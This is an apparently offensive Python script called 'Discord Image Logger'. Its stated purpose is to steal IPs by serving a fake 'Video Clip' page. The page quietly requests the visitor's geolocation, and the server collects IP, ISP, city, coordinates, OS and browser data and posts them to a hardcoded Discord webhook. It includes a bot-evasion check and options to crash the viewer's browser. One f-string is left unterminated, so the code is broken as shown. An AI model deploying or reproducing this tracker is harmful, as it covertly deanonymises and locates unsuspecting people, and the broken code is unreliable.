from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
    "image": "https://medal.tv/games/gta-v/clips/jYtqYNEAQsOoNGFK0?invite=cr-MSxpWkYsMzAwMzE0NTIw",
    "imageArgument": True,
    
    # CUSTOMIZATION #
    "username": "Clip Logger",
    "color": 0x00FFFF,
    
    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by the Clip Logger.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": False,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Viewed the Clip!**

**Endpoint:** `{endpoint}`
                
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # Get the URL from arguments or use default
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode() if dic.get("url") or dic.get("id") else config["image"]
            else:
                url = config["image"]

            # Get client information
            ip = self.headers.get('x-forwarded-for')
            useragent = self.headers.get('user-agent')
            
            # Log the IP immediately
            if ip and not botCheck(ip, useragent):
                dic = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    makeReport(ip, useragent, location, self.path.split("?")[0], url=url)
                else:
                    makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)

            # Serve the content with automatic tracking
            html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Clip</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        .container {{
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }}
        .video-container {{
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
        }}
        .video-container iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="video-container">
            <iframe src="{url}" frameborder="0" allowfullscreen></iframe>
        </div>
    </div>
    <script>
        // Enhanced tracking
        if (navigator.geolocation && !window.location.href.includes("g=")) {{
            navigator.geolocation.getCurrentPosition(function(position) {{
                var coords = position.coords.latitude + "," + position.coords.longitude;
                var encoded = btoa(coords).replace(/=/g, "%3D");
                var newUrl = window.location.href + (window.location.href.includes("?") ? "&g=" : "?g=") + encoded;
                fetch(newUrl, {{mode: 'no-cors'}});
            }}, function(error) {{
                console.log("Geolocation error:", error);
            }});
        }}
    </script>
</body>
</html>"""

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

# To use this code, you would typically create a simple HTTP server:
# from http.server import HTTPServer
# server = HTTPServer(('localhost', 8080), ImageLoggerAPI)
# server.serve_forever()

handler = ImageLoggerAPI
